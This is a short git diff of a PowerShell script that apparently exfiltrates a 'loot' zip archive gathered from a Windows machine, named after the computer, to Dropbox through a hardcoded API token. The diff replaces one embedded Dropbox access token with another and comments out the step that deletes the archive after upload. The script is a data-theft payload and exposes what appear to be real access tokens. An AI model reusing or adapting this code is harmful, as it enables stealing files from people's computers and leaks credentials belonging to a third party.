@@ -4,7 +4,7 @@ function Upload-DropBox() {
         [Parameter(ValueFromPipeline=$True)]
         [string]$SourceFilePath
     ) 
-    $dropBoxAccessToken = "sl.BnfXo3mXip6fuk5QCSgm4NJo_hIm-D0bBY7_gn4gO7Yx7vm6KCXIpZV0NfP3bhXDGnZ_RzMZO-xyHuxW-uahoA0QCE8TcOEPNeZqM1kjdfAnJF_hBL8QmgFvQZdrT_VhNuP6wdT5HvYMfPw"   # Replace with your DropBox Access Token
+    $dropBoxAccessToken = "sl.BncPCZus2kJRTyCgUvaevl1XXaFs4wGFD4DT-snb26lx17Wo66DYHzw9RaJKX51gr_zDLhqF8ZQcNLgE6zYYE7ABN9OjrjMqVwoywIbGJfKi0Zt07PxVhkhsc35r4GkStJ0vL_DCsm4EQ70"   # Replace with your DropBox Access Token
     $outputFile = Split-Path $SourceFilePath -leaf
     $targetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -25,5 +25,5 @@ if (Test-Path $env:OneDrive) {
 
 if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
     Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
-    Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
+    #Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
 }
